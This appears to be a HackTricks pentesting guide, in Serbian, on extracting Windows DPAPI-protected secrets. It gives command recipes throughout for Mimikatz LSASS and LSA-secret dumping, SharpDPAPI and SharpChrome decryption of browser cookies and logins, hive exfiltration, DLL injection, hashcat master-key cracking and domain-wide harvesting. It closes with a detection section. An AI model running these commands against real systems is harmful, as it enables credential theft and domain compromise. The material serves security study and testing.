# DPAPI - Ekstrakcija lozinki

{{#include ../../banners/hacktricks-training.md}}



## Šta je DPAPI

The Data Protection API (DPAPI) se prvenstveno koristi u Windows operativnom sistemu za **symmetric encryption of asymmetric private keys**, koristeći korisničke ili sistemske tajne kao značajan izvor entropije. Ovaj pristup pojednostavljuje enkripciju za developere tako što im omogućava da enkriptuju podatke koristeći ključ izveden iz korisničkih logon tajni ili, za sistemsku enkripciju, tajni za autentifikaciju domena sistema, čime developeri ne moraju sami da upravljaju zaštitom enkripcijskog ključa.

Najčešći način korišćenja DPAPI je preko funkcija **`CryptProtectData` i `CryptUnprotectData`**, koje omogućavaju aplikacijama da sigurno enkriptuju i dekriptuju podatke u okviru sesije procesa koji je trenutno ulogovan. To znači da podaci koji su enkriptovani mogu biti dekriptovani samo od strane istog korisnika ili sistema koji ih je enkriptovao.

Pored toga, ove funkcije prihvataju i **`entropy` parameter** koji se takođe koristi tokom enkripcije i dekripcije, dakle da biste dekriptovali nešto što je enkriptovano koristeći ovaj parametar, morate pružiti istu vrednost entropije koja je korišćena pri enkripciji.

### Generisanje korisničkog ključa

DPAPI generiše jedinstveni ključ (nazvan **`pre-key`**) za svakog korisnika na osnovu njihovih kredencijala. Ovaj ključ je izveden iz korisničke lozinke i drugih faktora, a algoritam zavisi od tipa korisnika ali se na kraju svodi na SHA1. Na primer, za domen korisnike, **to zavisi od NTLM hash-a korisnika**.

Ovo je posebno interesantno jer ako napadač može da pribavi hash korisničke lozinke, on može:

- **Dekriptovati bilo koje podatke koji su enkriptovani koristeći DPAPI** sa tim korisničkim ključem bez potrebe da kontaktira bilo koji API
- Pokušati da **crack-uje lozinku** offline pokušavajući da generiše validan DPAPI ključ

Pored toga, svaki put kada korisnik enkriptuje podatke koristeći DPAPI, generiše se novi **master key**. Taj master key je zapravo korišćen za enkripciju podataka. Svakom master key-u je dodeljen **GUID** (Globally Unique Identifier) koji ga identifikuje.

Master keys se čuvaju u direktorijumu **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, gde je `{SID}` Security Identifier tog korisnika. Master key je pohranjen enkriptovan korisnikovim **`pre-key`** i takođe enkriptovan pomoću **domain backup key** za oporavak (tako da je isti ključ pohranjen enkriptovan na 2 načina).

Napomena da je **domain key koji se koristi za enkripciju master key-a na domain controller-ima i nikada se ne menja**, pa ako napadač ima pristup domain controller-u, može da pribavi domain backup key i dekriptuje master keys svih korisnika u domenu.

Enkriptovani blob-ovi sadrže **GUID master key-a** koji je korišćen za enkripciju podataka unutar svojih header-a.

> [!TIP]
> DPAPI encrypted blobs starts with **`01 00 00 00`**

Find master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
This is what a bunch of Master Keys of a user will looks like:

![](<../../images/image (1121).png>)

### Generisanje ključa za mašinu/sistem

Ovo je ključ koji mašina koristi za enkripciju podataka. Baziran je na **DPAPI_SYSTEM LSA secret**, koji je poseban ključ kojem pristupa samo SYSTEM user. Ovaj ključ se koristi za enkripciju podataka kojima sam sistem treba da ima pristup, kao što su kredencijali na nivou mašine ili sistemske tajne.

Imajte na umu da ovi ključevi **don't have a domain backup** pa su dostupni samo lokalno:

- **Mimikatz** može da mu pristupi dumpovanjem LSA secrets koristeći komandu: `mimikatz lsadump::secrets`
- Tajna je sačuvana u registru, tako da administrator može **modify the DACL permissions to access it**. Putanja u registru je: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Offline extraction iz registry hives takođe je moguća. Na primer, kao administrator na cilju, sačuvajte hive-ove i exfiltrate ih:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
Zatim, na vašoj analiznoj mašini, izvucite DPAPI_SYSTEM LSA secret iz hives i iskoristite ga za dešifrovanje machine-scope blobs (lozinke zakazanih zadataka, kredencijali servisa, Wi‑Fi profili, itd.):
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### Podaci zaštićeni pomoću DPAPI

Među ličnim podacima zaštićenim pomoću DPAPI su:

- Windows creds
- Internet Explorer i Google Chrome lozinke i podaci za automatsko popunjavanje
- E-mail i lozinke internih FTP naloga za aplikacije kao što su Outlook i Windows Mail
- Lozinke za deljene foldere, resurse, wireless mreže i Windows Vault, uključujući enkripcijske ključeve
- Lozinke za udaljene desktop konekcije, .NET Passport i privatni ključevi za razne enkripcijske i autentifikacione svrhe
- Mrežne lozinke koje upravlja Credential Manager i lični podaci u aplikacijama koje koriste CryptProtectData, kao što su Skype, MSN messenger i dr.
- Šifrovani blobovi u registru
- ...

Sistemski zaštićeni podaci uključuju:
- Wi‑Fi lozinke
- Lozinke za zakazane zadatke
- ...

### Opcije ekstrakcije master ključeva

- Ako korisnik ima privilegije domain admin, može pristupiti **ključu za rezervnu kopiju domena** da dešifruje sve korisničke master ključeve u domenu:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Sa local admin privileges moguće je **access the LSASS memory** i izvući DPAPI master keys svih connected users i SYSTEM key.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Ako korisnik ima lokalne administratorske privilegije, može pristupiti **DPAPI_SYSTEM LSA secret** da dešifruje master ključeve mašine:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
Ako je password ili NTLM hash korisnika poznat, možete **decrypt the master keys of the user directly**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Ako ste u sesiji kao korisnik, moguće je zatražiti od DC-a **backup key to decrypt the master keys using RPC**. Ako ste local admin i korisnik je prijavljen, za ovo možete **steal his session token**:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Lista Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Pristup DPAPI šifrovanim podacima

### Pronalaženje DPAPI šifrovanih podataka

Uobičajeni korisnički **zaštićeni fajlovi** nalaze se u:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Proverite i zamenu `\Roaming\` sa `\Local\` u gore navedenim putanjama.

Primeri enumeracije:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) može pronaći DPAPI šifrovane blob-ove u datotečnom sistemu, registru i B64 blob-ovima:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Imajte na umu da [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (iz istog repozitorijuma) može da se koristi za dekriptovanje pomoću DPAPI osetljivih podataka kao što su cookies.

#### Chromium/Edge/Electron brzi recepti (SharpChrome)

- Trenutni korisnik, interaktivno dekriptovanje sačuvanih logins/cookies (radi čak i sa Chrome 127+ app-bound cookies zato što se dodatni ključ rešava iz korisnikovog Credential Manager-a kada se pokreće u korisničkom kontekstu):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- Offline analiza kada imate samo fajlove. Prvo ekstrahujte AES state key iz profila "Local State" i zatim ga iskoristite da dešifrujete cookie DB:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- Domain-wide/remote triage kada imate DPAPI domain backup key (PVK) i admin na ciljnom hostu:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- Ako imate DPAPI prekey/credkey korisnika (iz LSASS), možete preskočiti password cracking i direktno dešifrovati podatke profila:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
Napomene
- Novije Chrome/Edge verzije mogu čuvati neke kolačiće koristeći "App-Bound" enkripciju. Offline dešifrovanje tih specifičnih kolačića nije moguće bez dodatnog app-bound ključa; pokrenite SharpChrome u kontekstu ciljnog korisnika da biste ga automatski preuzeli. Pogledajte objavu na Chrome security blogu navedenu ispod.

### Pristupni ključevi i podaci

- **Koristite SharpDPAPI** za dobijanje kredencijala iz DPAPI-šifrovanih fajlova iz trenutne sesije:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Pribavite informacije o kredencijalima** kao što su šifrovani podaci i guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Access masterkeys**:

Dešifrujte masterkey korisnika koji zahteva **domain backup key** koristeći RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Alat **SharpDPAPI** takođe podržava ove argumente za dešifrovanje master ključa (primetite kako je moguće koristiti `/rpc` da biste dobili domains backup key, `/password` da biste koristili plaintext password, ili `/pvk` da navedete DPAPI domain private key file...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Dešifrujte podatke koristeći masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Alat **SharpDPAPI** takođe podržava ove argumente za dešifrovanje `credentials|vaults|rdg|keepass|triage|blob|ps` (obratite pažnju kako je moguće koristiti `/rpc` da biste dobili domains backup key, `/password` da biste koristili plaintext password, `/pvk` da biste naveli DPAPI domain private key file, `/unprotect` da biste koristili current users session...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Korišćenje DPAPI prekey/credkey direktno (bez potrebe za lozinkom)

Ako možete da dump-ujete LSASS, Mimikatz često izloži per-logon DPAPI key koji se može koristiti za dešifrovanje korisnikovih masterkeys bez poznavanja plaintext password. Prosledite ovu vrednost direktno alatima:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- Dekriptovati neke podatke koristeći **trenutnu korisničku sesiju**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Offline dekriptovanje pomoću Impacket dpapi.py

Ako imate SID i lozinku korisnika žrtve (ili NT hash), možete dekriptovati DPAPI masterkeys i Credential Manager blobs potpuno offline koristeći Impacket’s dpapi.py.

- Identifikujte artefakte na disku:
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- Podudarajući masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Ako alat za transfer fajlova nije pouzdan, enkodirajte fajlove u base64 na hostu i kopirajte izlaz:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- Dešifrujte masterkey pomoću korisnikovog SID-a i password/hash-a:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- Iskoristite dekriptovani masterkey da dešifrujete credential blob:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
Ovaj radni tok često vraća domen kredencijale sačuvane od strane aplikacija koje koriste Windows Credential Manager, uključujući administrativne naloge (npr., `*_adm`).

---

### Rukovanje opcionom entropijom ("Entropija treće strane")

Neke aplikacije prosleđuju dodatnu vrednost **entropije** funkciji `CryptProtectData`. Bez te vrednosti blob se ne može dekriptovati, čak i ako je ispravan masterkey poznat. Stoga je dobijanje entropije neophodno kada se ciljaju kredencijali zaštićeni na ovaj način (npr. Microsoft Outlook, neki VPN klijenti).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) je user-mode DLL koja hook-uje DPAPI funkcije unutar ciljnog procesa i transparentno beleži svaku opcionu entropiju koja je prosleđena. Pokretanje EntropyCapture u režimu **DLL-injection** protiv procesa kao što su `outlook.exe` ili `vpnclient.exe` će izbaciti fajl koji mapira svaki entropy buffer na pozivajući proces i blob. Uhvaćena entropija se kasnije može proslediti alatima **SharpDPAPI** (`/entropy:`) ili **Mimikatz** (`/entropy:<file>`) kako bi se podaci dešifrovali.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Microsoft je uveo format masterkey-a **context 3** počevši od Windows 10 v1607 (2016). `hashcat` v6.2.6 (decembar 2023) je dodao hash-modes **22100** (DPAPI masterkey v1 context), **22101** (context 1) i **22102** (context 3), omogućavajući GPU-accelerated cracking of user passwords direktno iz masterkey fajla. Napadači stoga mogu izvoditi word-list ili brute-force napade bez interakcije sa ciljnim sistemom.

`DPAPISnoop` (2024) automatizuje proces:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Alat takođe može parsirati Credential i Vault blobs, decrypt them with cracked keys and export cleartext passwords.

### Pristup podacima druge mašine

U **SharpDPAPI and SharpChrome** možete navesti opciju **`/server:HOST`** da pristupite podacima udaljenog računara. Naravno, morate moći da pristupite tom računaru i u sledećem primeru se pretpostavlja da je poznat **domain backup encryption key**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Ostali alati

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) je alat koji automatizuje izvlačenje svih korisnika i računara iz LDAP direktorijuma i izdvajanje ključa za backup domain controllera putem RPC-a. Skripta će zatim razrešiti IP adrese svih računara i pokrenuti smbclient na svim računarima kako bi preuzela sve DPAPI blob-ove svih korisnika i dešifrovala sve pomoću domain backup ključa.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Sa liste računara izvučene iz LDAP-a možete pronaći svaku podmrežu čak i ako ih niste poznavali!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) može automatski da ispumpa tajne zaštićene DPAPI-jem. Verzija 2.x je uvela:

* Paralelno prikupljanje blob-ova sa stotina hostova
* Parsiranje **context 3** masterkey-eva i automatska integracija sa Hashcat-om za crackovanje
* Podrška za Chrome "App-Bound" enkriptovane kolačiće (pogledajte sledeći odeljak)
* Novi režim **`--snapshot`** za ponovljeno ispitivanje endpoint-ova i diff novo-kreiranih blob-ova

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) je C# parser za masterkey/credential/vault fajlove koji može da generiše Hashcat/JtR formate i opciono automatski pokreće crackovanje. Potpuno podržava machine i user masterkey formate do Windows 11 24H1.


## Uobičajene detekcije

- Pristup fajlovima u `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` i drugim direktorijumima vezanim za DPAPI.
- Posebno sa mrežnog deljenja kao što su **C$** ili **ADMIN$**.
- Korišćenje **Mimikatz**, **SharpDPAPI** ili sličnih alata za pristup LSASS memoriji ili dumpovanje masterkey-eva.
- Događaj **4662**: *An operation was performed on an object* – može se povezati sa pristupom objektu **`BCKUPKEY`**.
- Događaj **4673/4674** kada proces zahteva *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### 2023-2025 ranjivosti & promene u ekosistemu

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (novembar 2023). Napadač sa mrežnim pristupom mogao je prevariti člana domene da preuzme zlonamerni DPAPI backup ključ, omogućavajući dešifrovanje korisničkih masterkey-eva. Ispravljeno u cumulative update-u iz novembra 2023 – administratori treba da osiguraju da su DC-i i radne stanice potpuno zakrpljeni.
* **Chrome 127 “App-Bound” cookie encryption** (jul 2024) je zamenio legacy DPAPI-only zaštitu dodatnim ključem koji se čuva u korisnikovom **Credential Manager**. Offline dešifrovanje kolačića sada zahteva i DPAPI masterkey i **GCM-wrapped app-bound key**. SharpChrome v2.3 i DonPAPI 2.x mogu da oporave dodatni ključ kada se pokreću u korisničkom kontekstu.


### Case Study: Zscaler Client Connector – Custom Entropy Derived From SID

Zscaler Client Connector čuva nekoliko konfig fajlova u `C:\ProgramData\Zscaler` (npr. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Svaki fajl je šifrovan pomoću **DPAPI (Machine scope)**, ali vendor obezbeđuje **custom entropy** koja se *izračunava u runtime-u* umesto da bude sačuvana na disku.

Entropija se rekonstruiše iz dva elementa:

1. Hardkodirana tajna ugrađena u `ZSACredentialProvider.dll`.
2. **SID** Windows naloga kojem konfiguracija pripada.

Algoritam koji DLL implementira je ekvivalentan:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Pošto je tajna ugrađena u DLL koji se može pročitati sa diska, **bilo koji lokalni napadač sa SYSTEM pravima može regenerisati entropiju za bilo koji SID** i dešifrovati blobove vanmrežno:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Dešifrovanje vraća kompletnu JSON konfiguraciju, uključujući svaki **device posture check** i njegovu očekivanu vrednost – informaciju koja je veoma vredna pri pokušajima client-side bypasses.

> SAVET: ostali šifrovani artefakti (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) su zaštićeni DPAPI **without** entropy (`16` zero bytes). Stoga se mogu direktno dešifrovati pomoću `ProtectedData.Unprotect` nakon što se dobiju SYSTEM privilegije.

## References

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)
- [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [GhostPack SharpDPAPI/SharpChrome – Usage and options](https://github.com/GhostPack/SharpDPAPI)

{{#include ../../banners/hacktricks-training.md}}
